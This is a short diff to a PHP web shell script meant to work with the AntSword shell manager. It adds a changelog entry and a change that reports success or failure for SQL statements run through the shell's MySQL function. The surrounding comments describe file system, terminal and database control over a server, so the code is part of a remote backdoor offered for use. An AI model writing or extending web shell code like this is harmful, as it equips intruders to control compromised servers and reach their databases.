@@ -24,7 +24,9 @@
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
-* 
+*   Data: 2016/05/13 v1.1
+*    1. 执行 DML 语句，显示执行状态
+*
 *   Date: 2016/04/06 v1.0
 *    1. 文件系统 和 terminal 管理
 *    2. mysql 数据库支持
@@ -131,6 +133,9 @@ function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
     $encode = decode(EC($encode));
     $conn = @mysqli_connect($host, $user, $password);
     $res = @mysqli_query($conn, $sql);
+    if (is_bool($res)) {
+        return "Status".$columnsep.$rowsep.($res?"True":"False").$columnsep.$rowsep;
+    }
     $i=0;
     if ($needcoluname) {
         while ($col=@mysqli_fetch_field($res)) {
